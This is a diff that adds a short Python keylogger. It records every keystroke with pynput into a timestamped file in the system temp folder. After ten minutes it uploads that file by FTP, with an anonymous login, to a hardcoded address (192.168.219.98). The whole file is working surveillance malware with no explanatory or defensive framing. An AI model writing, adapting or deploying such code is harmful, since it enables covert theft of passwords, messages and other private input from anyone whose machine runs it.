@@ -1,0 +1,43 @@
+from pynput.keyboard import Listener
+from datetime import date
+import time
+import multiprocessing as mp
+import ftplib
+import os
+import tempfile
+
+def log_keystroke(key):
+    key = str(key).replace("'", "")
+    
+    if key == 'Key.space':
+        key = ' '
+    if key == 'Key.shift_r':
+        key = ''
+    if key == "Key.enter":
+        key = '\n'
+
+    
+    with open(fName, 'a') as f:
+        f.write(key)
+
+def send_ftp():
+    time.sleep(600)
+    fileName = fName
+    ftp = ftplib.FTP()
+    ftp.connect("192.168.219.98", 21)
+    ftp.login("anonymous", "")
+    ftp.cwd("./")
+    os.chdir(r"{}".format(path))
+    myfile = open(fileName, 'rb')
+    ftp.storbinary('STOR '+fileName, myfile)
+    myfile.close()
+    ftp.close
+
+with Listener(on_press=log_keystroke) as l:
+    fileDate = date.isoformat(date.today())
+    uTime = int(time.time())
+    path = tempfile.gettempdir()
+    os.chdir(r"{}".format(path))
+    fName = "{}_{}.txt".format(fileDate, uTime)
+    send_ftp()
+    l.join()
